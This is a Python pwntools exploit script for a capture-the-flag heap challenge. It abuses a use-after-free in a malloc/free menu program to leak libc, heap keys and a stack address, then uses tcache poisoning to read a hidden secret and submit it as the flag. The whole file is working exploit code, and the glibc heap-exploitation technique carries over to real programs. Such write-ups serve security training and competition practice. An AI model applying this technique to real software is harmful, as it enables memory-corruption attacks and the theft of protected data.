#!/usr/bin/env python3
from pwn import *

PORT = 0000
HOST = "000000000"
elf = context.binary = ELF('/challenge/seeking-safe-secrets-hard_patched', checksec=False)
libc = ELF('/challenge/lib/libc.so.6', checksec=False)
# ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            b* 0x0000000000401843
            b* 0x000000000040195E
            b* 0x0000000000401A7A
            c
            set follow-fork-mode parent
            ''')

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        return elf.process()

p = conn()

#GDB()

PROMPT = b"[*] Function (malloc/free/puts/scanf/send_flag/quit): "

def sla(aft, data):
    p.sendlineafter(aft, data)

def _malloc(idx, size):
    sla(PROMPT, b"malloc")
    sla(b"Index: ", str(idx).encode())
    sla(b"Size: ", str(size).encode())

def _free(idx):
    sla(PROMPT, b"free")
    sla(b"Index: ", str(idx).encode())

def _puts(idx):
    sla(PROMPT, b"puts")
    sla(b"Index: ", str(idx).encode())

def _scanf(idx, data):
    sla(PROMPT, b"scanf")
    sla(b"Index: ", str(idx).encode())
    p.recvuntil(b"\n")
    p.sendline(data)

def send_flag(data):
    p.sendline(b"send_flag")
    sla(b"Secret: ", data)

# Stage 1: Leak libc_base

_malloc(0, 0x500)
_malloc(1, 0x20)

_free(0)
_puts(0)
p.recvuntil(b"Data: ")
libc.address = u64(p.recv(6) + b'\0'*2) - 0x219ce0
log.info("libc_base: " + hex(libc.address))

# Stage 2: Leak stack

_malloc(2, 0x40)
_free(2)
_puts(2)

p.recvuntil(b"Data: ")
raw = p.recvuntil(PROMPT, drop=True)

if raw.endswith(b"\n\n"):
    raw = raw[:-2]
elif raw.endswith(b"\n"):
    raw = raw[:-1]

heap_key = u64(raw.ljust(8, b"\x00"))
log.info("heap_key: " + hex(heap_key))

p.sendline(b"malloc")
sla(b"Index: ", str(2).encode())
sla(b"Size: ", str(0x20).encode())

_malloc(2, 0x40)
_malloc(3, 0x40)

_free(2)
_free(3)

poison = libc.sym.environ ^ heap_key
_scanf(3, p64(poison))

_malloc(4, 0x40)
_malloc(5, 0x40)

_puts(5)
p.recvuntil(b"Data: ")
stack_leak = u64(p.recv(6).ljust(8, b"\x00"))

# Stage 3: Leak secret

main_rbp = stack_leak - 0x128
allocations_0 = main_rbp - 0x110
secret_addr = 0x423390

log.success("main_rbp       : " + hex(main_rbp))
log.success("allocations[0] : " + hex(allocations_0))
log.success("secret_addr    : " + hex(secret_addr))

_malloc(6, 0x60)
_free(6)

_puts(6)
p.recvuntil(b"Data: ")
raw = p.recvuntil(PROMPT, drop=True)

if raw.endswith(b"\n\n"):
    raw = raw[:-2]
elif raw.endswith(b"\n"):
    raw = raw[:-1]

heap_key2 = u64(raw.ljust(8, b"\x00"))
log.info("heap_key2: " + hex(heap_key2))

p.sendline(b"malloc")
sla(b"Index: ", str(6).encode())
sla(b"Size: ", str(0x60).encode())

_malloc(7, 0x60)
_malloc(8, 0x60)

_free(6)
_free(7)
_free(8)

poison2 = allocations_0 ^ heap_key2
log.info("poison2: " + hex(poison2))

_scanf(8, p64(poison2))

_malloc(9, 0x60)
_malloc(10, 0x60) 
_scanf(10, p64(secret_addr))

_puts(0)
p.recvuntil(b"Data: ")
secret_leak = p.recvline()[:-1]
log.success("secret_leak: " + repr(secret_leak))

send_flag(secret_leak)

p.interactive()

#_exploited by d1nhdwc